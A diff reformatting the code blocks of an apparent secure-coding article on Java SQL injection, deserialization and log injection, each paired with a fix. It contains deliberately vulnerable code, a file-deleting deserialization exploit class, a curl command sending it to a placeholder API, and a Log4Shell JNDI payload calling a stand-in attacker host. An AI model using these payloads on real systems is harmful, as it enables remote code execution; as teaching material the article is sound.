@@ -51,7 +51,8 @@ The following code retrieves a user from the database considering the username p
 |-----------------------------------------------------------------------------------------------------------------------------------------------|----------------------------|
 | ![](Screenshot-2024-08-27-at-16.00.02-300x218.png) | 
 
-<pre class="EnlighterJSRAW" data-enlighter-language="java">public List findUsers(String user, String pass) throws Exception {
+```java
+public List findUsers(String user, String pass) throws Exception {
        String query = "SELECT userid FROM users " +
                    "WHERE username='" + user + "' AND password='" + pass + "'";
        Statement statement = connection.createStatement();
@@ -62,7 +63,8 @@ The following code retrieves a user from the database considering the username p
        }
        return users;
 }
-</pre>
+```
+
 
  |
 
@@ -72,16 +74,23 @@ However, when the attacker uses injection techniques, this code, using string in
 
 To fix this problem we would change this approach from using string concatenation to parameter injection. In fact, String concatenation is generally a bad idea, in terms of performance and security.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="java">String query = "SELECT userid FROM users " +
-               "WHERE username='" + user + "' AND password='" + pass + "'";</pre>
+```java
+String query = "SELECT userid FROM users " +
+               "WHERE username='" + user + "' AND password='" + pass + "'";
+```
+
 
 Changing the inclusion of the parameter values directly in the SQL String, to parameters that we can reference later will solve the problem of hacked queries.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="java">String query = "SELECT userid FROM users WHERE username = ? AND password = ?";</pre>
+```java
+String query = "SELECT userid FROM users WHERE username = ? AND password = ?";
+```
+
 
 Our fixed code will look like this, with the prepareStatement and the value setting for each parameter.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="java">public List findUsers(String user, String pass) throws Exception {
+```java
+public List findUsers(String user, String pass) throws Exception {
    String query = "SELECT userid FROM users WHERE username = ? AND password = ?";
    try (PreparedStatement statement = connection.prepareStatement(query)) {
        statement.setString(1, user);
@@ -93,7 +102,9 @@ Our fixed code will look like this, with the prepareStatement and the value sett
        }
        return users;
    }
-}</pre>
+}
+```
+
 
 The SonarQube and SonarCloud rules that help detect the SQL injection vulnerability can be found [here](https://rules.sonarsource.com/java/RSPEC-3649 "here")
 
@@ -105,7 +116,8 @@ Common usages of deserialization include data sent between APIs and Web services
 
 Converting the message payload into an Object can involve serious vulnerabilities if no sanitizing or checking steps are implemented.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="java">protected void doGet(HttpServletRequest request, HttpServletResponse response) {
+```java
+protected void doGet(HttpServletRequest request, HttpServletResponse response) {
     ServletInputStream servletIS = request.getInputStream();
     ObjectInputStream  objectIS  = new ObjectInputStream(servletIS);
     User user                 = (User) objectIS.readObject();
@@ -121,7 +133,9 @@ class User implements Serializable {
     public String getName() {
         return name;
     }
-}</pre>
+}
+```
+
 
 We can see here that we are using `objectIS`, a direct value coming from the user in the request input stream, and converting it to a new object.  
 
@@ -129,7 +143,8 @@ We expect that the value will always be one of the classes that our application 
 
 But what if a malicious client is sending another class in the request?
 
-<pre class="EnlighterJSRAW" data-enlighter-language="java">public class Exploit implements Serializable {
+```java
+public class Exploit implements Serializable {
     private static final long serialVersionUID = 1L;
 
     private void readObject(java.io.ObjectInputStream in) {
@@ -140,35 +155,44 @@ But what if a malicious client is sending another class in the request?
             e.printStackTrace();
         }
     }
-}</pre>
+}
+```
+
 
 In this case, we have a class that deletes a file during the overridden `readObject` method, which will happen on the previous `readObject` call.
 
 The attacker only needs to serialize this class and send it to the API:
 
-<pre class="EnlighterJSRAW" data-enlighter-language="java">   Exploit exploit = new Exploit();
+```java
+   Exploit exploit = new Exploit();
    FileOutputStream fileOut = new FileOutputStream("exploit.ser");
    ObjectOutputStream out = new ObjectOutputStream(fileOut);
    out.writeObject(exploit);
 ...
-$ curl -X POST --data-binary @exploit.ser http://vulnerable-api.com/user</pre>
+$ curl -X POST --data-binary @exploit.ser http://vulnerable-api.com/user
+```
+
 
 This will cause our call to fail with a class cast Exception, but this won't prevent it from executing the malicious code that happens before the cast.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="java">java.lang.ClassCastException: class org.vulnerable.Exploit cannot be cast to class org.vilojona.topsecurityflaws.deserialization.User</pre>
+```java
+java.lang.ClassCastException: class org.vulnerable.Exploit cannot be cast to class org.vilojona.topsecurityflaws.deserialization.User
+```
+
 
 Fortunately, there's an easy way to fix this. We need to check if the class to be deserialized is from one of the allowed types before creating the object.
 
 In the code below, we have created a new ObjectInputStream with the "resolveClass" method overridden containing a check on the class name. We use this new class, SecureObjectInputStream, to get the object stream. But we include an allowed list check before reading the stream into an object (User).
 
-<pre class="EnlighterJSRAW" data-enlighter-language="java"> public class SecureObjectInputStream extends ObjectInputStream {
-   private static final Set&lt;String&gt; ALLOWED_CLASSES = Set.of(User.class.getName());
+```java
+ public class SecureObjectInputStream extends ObjectInputStream {
+   private static final Set<String> ALLOWED_CLASSES = Set.of(User.class.getName());
 
    public SecureObjectInputStream(InputStream inputStream) throws IOException {
      super(inputStream);
    }
    @Override
-   protected Class&lt;?&gt; resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException {
+   protected Class<?> resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException {
      if (!ALLOWED_CLASSES.contains(osc.getName())) {
        throw new InvalidClassException("Unauthorized deserialization", osc.getName());
      }
@@ -182,7 +206,9 @@ In the code below, we have created a new ObjectInputStream with the "resolveClas
      ObjectInputStream  objectIS  = new SecureObjectInputStream(servletIS);
      User input                 = (User) objectIS.readObject();
    }
- }</pre>
+ }
+```
+
 
 The SonarCloud/SonarQube and SonarLint rules that help detect the deserialization injection vulnerability can be found [here](https://rules.sonarsource.com/java/RSPEC-5135 "here")
 
@@ -200,12 +226,15 @@ We can find issues like log forging and pollution when the attacker modifies the
 
 Let's consider the following code, where we take a value from the user and log it.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="java">public void doGet(HttpServletRequest request, HttpServletResponse response) {
+```java
+public void doGet(HttpServletRequest request, HttpServletResponse response) {
     String user = request.getParameter("user");
     if (user != null){
       logger.log(Level.INFO, "User: {0} login in", user);
     }
-}</pre>
+}
+```
+
 
 It looks harmless, right?
 
@@ -216,18 +245,25 @@ But what if the attacker tries to log in with this user?
 
 It's clearly a wrong user name and it will fail. But, it will be logged and the person checking the log will get very confused.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="java">2024-08-19 12:34:56 INFO User 'john' login in 
-2024-08-19 12:34:56 ERROR User 'admin' login in</pre>
+```java
+2024-08-19 12:34:56 INFO User 'john' login in 
+2024-08-19 12:34:56 ERROR User 'admin' login in
+```
+
 
 Or even worse !! If the attacker knows the system is using a non-patched Log4J version, they can send the below value as the user and the system will suffer from remote execution. The LDAP server controlled by the attacker responds with a reference to a malicious Java class hosted on a remote server. The vulnerable application downloads and executes this class, giving the attacker control over the server.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic">$ { jndi:ldap://malicious-server.com/a}</pre>
+```
+$ { jndi:ldap://malicious-server.com/a}
+```
+
 
 But we can prevent these issues easily.
 
 Sanitizing the values to be logged is important to avoid the log forging vulnerability, as it can lead to confusing outputs forged by the user.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="java">   // Log the sanitised username
+```java
+   // Log the sanitised username
    String user = sanitiseInput(request.getParameter("user"));
  }
 
@@ -237,19 +273,28 @@ private String sanitiseInput(String input) {
      input = input.replaceAll("[\\n\\r]", "_");
    }
    return input;
- }</pre>
+ }
+```
+
 
 The result we'll see in the logs is the following, making it now easier to see that all the logs belong to the same call to the log system.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic">2024-08-19 12:34:56 INFO User 'john' login in_2024-08-19 12:34:56 ERROR User 'admin' login in</pre>
+```
+2024-08-19 12:34:56 INFO User 'john' login in_2024-08-19 12:34:56 ERROR User 'admin' login in
+```
+
 
 In order to prevent the exploit to the logging system, it's important to keep our libraries updated to the latest stable versions as much as possible. For log4j, that remediation would disable the functionality. We can also manually disable JNDI.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic">-Dlog4j2.formatMsgNoLookups=true</pre>
+```
+-Dlog4j2.formatMsgNoLookups=true
+```
+
 
 If you still need to use JNDI, then a common sanitizing process could avoid malicious attacks by just checking the destination against an allowed destinations list.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="java">public class AllowedlistJndiContextFactory implements InitialContextFactory {
+```java
+public class AllowedlistJndiContextFactory implements InitialContextFactory {
    // Define your list of allowed JNDI URLs
    private static final List ALLOWED_JNDI_PREFIXES = Arrays.asList(
        "ldap://trusted-server.com",
@@ -278,11 +323,16 @@ If you still need to use JNDI, then a common sanitizing process could avoid mali
        }
        return false;
    }
-}</pre>
+}
+```
+
 
 And configure our system to use the filtering context factory.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic">-Djava.naming.factory.initial=com.yourpackage.AllowedlistJndiContextFactory</pre>
+```
+-Djava.naming.factory.initial=com.yourpackage.AllowedlistJndiContextFactory
+```
+
 
 The SonarCloud/SonarQube and SonarLint rules that help detect the logging injection vulnerability can be found [here](https://rules.sonarsource.com/java/RSPEC-5145 "here")
 
